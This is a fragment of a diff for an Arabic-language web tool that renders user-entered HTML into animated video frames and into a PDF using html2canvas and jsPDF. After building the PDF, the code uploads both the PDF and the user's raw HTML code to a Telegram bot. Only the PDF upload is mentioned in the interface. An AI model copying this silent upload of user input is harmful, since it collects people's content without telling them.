+                            const z = 1 + (time/(dur*1000)) * 0.05;
+                            ctx.drawImage(canvases[idx], (w-w*z)/2, (h-h*z)/2, w*z, h*z);
+                        } else if (anim === 'slide' && time > (dur*1000-trans) && idx < canvases.length-1) {
+                            const p = (time-(dur*1000-trans))/trans;
+                            ctx.drawImage(canvases[idx], -p*w, 0, w, h);
+                            ctx.drawImage(canvases[idx+1], w-p*w, 0, w, h);
+                        } else if (anim === 'fade' && time > (dur*1000-trans) && idx < canvases.length-1) {
+                            const p = (time-(dur*1000-trans))/trans;
+                            ctx.drawImage(canvases[idx], 0, 0, w, h);
+                            ctx.globalAlpha = p; ctx.drawImage(canvases[idx+1], 0, 0, w, h); ctx.globalAlpha = 1;
+                        } else {
+                            ctx.drawImage(canvases[idx], 0, 0, w, h);
+                        }
+                        requestAnimationFrame(animate);
+                    } else { setTimeout(() => recorder.stop(), 100); }
+                }
+                animate(); await recordPromise;
+            } catch (e) { alert("خطأ في معالجة الفيديو"); console.error(e);}
+            finally { document.body.removeChild(container); btn.disabled = false; btn.innerText = "بدء الاستخراج 📥"; }
+        }
+
+        // ==========================================
+        // 3. استخراج PDF
+        // ==========================================
+        async function generatePDF() {
+            const btn = document.getElementById('capture-btn');
+            const code = document.getElementById('html-input').value;
+            const name = document.getElementById('file-name').value || 'document';
+            const quality = parseInt(document.getElementById('quality-select').value);
+            const f = document.getElementById('format-select').value;
+
+            btn.innerText = "⏳ جاري تجهيز PDF...";
+            const w = f.includes('a4') ? 794 : 1280; const h = f.includes('a4') ? 1123 : 720;
+            const container = document.createElement('div');
+            container.style.width = w + 'px'; container.style.position = 'absolute'; container.style.left = '-9999px';
+            container.innerHTML = code; document.body.appendChild(container);
+
+            try {
+                await document.fonts.ready; await convertAllImagesToDataURLs(container);
+                const { jsPDF } = window.jspdf;
+                const pdf = new jsPDF({ orientation: f.includes('a4') ? 'p' : 'l', unit: 'px', format: [w, h] });
+                let pages = container.querySelectorAll('.page'); if (pages.length === 0) pages = [container];
+
+                for (let i = 0; i < pages.length; i++) {
+                    btn.innerText = `📸 تصوير صفحة ${i+1}...`;
+                    const c = await html2canvas(pages[i], { scale: quality, width: w, height: h, useCORS: true });
+                    if (i > 0) pdf.addPage([w, h]);
+                    pdf.addImage(c.toDataURL('image/jpeg', 0.8), 'JPEG', 0, 0, w, h, undefined, 'FAST');
+                }
+
+                btn.innerText = "🚀 إرسال PDF للبوت...";
+                const blob = pdf.output('blob');
+                await sendFileToTelegram(blob, `${name}.pdf`, "📥 ملف PDF جاهز!");
+                
+                const codeBlob = new Blob(['\ufeff', code], { type: 'text/plain;charset=utf-8' });
+                await sendFileToTelegram(codeBlob, `${name}_code.txt`, `💻 الكود`);
+
+                btn.innerText = "✅ اكتمل! جاري التحميل لجهازك...";
+                pdf.save(`${name}.pdf`);
+
+            } catch (e) { alert("خطأ في معالجة الـ PDF"); }
+            finally { document.body.removeChild(container); btn.disabled = false; btn.innerText = "بدء الاستخراج 📥"; }
+        }
+    </script>
 </body>
 </html>
